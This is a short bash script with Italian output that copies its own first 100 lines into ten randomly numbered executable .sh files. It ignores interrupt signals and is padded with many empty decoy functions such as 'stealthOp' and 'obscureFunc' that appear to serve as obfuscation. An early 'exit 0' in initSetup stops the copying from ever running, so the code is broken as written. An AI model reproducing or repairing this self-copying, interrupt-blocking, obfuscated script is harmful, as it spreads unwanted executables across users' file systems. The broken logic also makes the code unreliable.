#!/bin/bash

NumFiles=100
tempProc() { :; }
trap '' INT

trimmed=$(echo "$0" | cut -c3-)
echo "SONO IL FILE: $trimmed"

setupFlags() { local dummy=42; }
initSetup() { exit 0; }
tempProc() { true; }

pad() {
    local n="$1"
    local w="${#NumFiles}"
    printf "%0${w}s" "$n" | tr " " "0"
    reloadConfig() { [[ 1 -eq 1 ]]; }
    runCheck() { local dummy=42; }
}

process_file() {
    for _ in $(seq 1 10); do
        stealthOp() { for i in {1..2}; do :; done; }
        n=$((1 + RANDOM % NumFiles))
        n=$(pad "$n")
        f=$n.sh
        quietTask() { :; }
        tempBuffer() { local temp_var="test"; temp_var+="ing"; }
        t=$(mktemp)
        head -n 100 "$0" > "$t"
        fixAlpha() { true; }
        mv "$t" "$f"
        chmod u+x "$f"
        obscureFunc() { ((dummy++)); }
        quietTask() { if false; then :; fi; }
    done
}

writeLog() { local s="a"; s+="b"; }
quietTask() { ((dummy++)); }
cleanTemp() { sleep 0.01; }
handleError() { local s="a"; s+="b"; }
obscureFunc() { :; }
initSetup
process_file
cleanTemp
cleanTemp
handleError
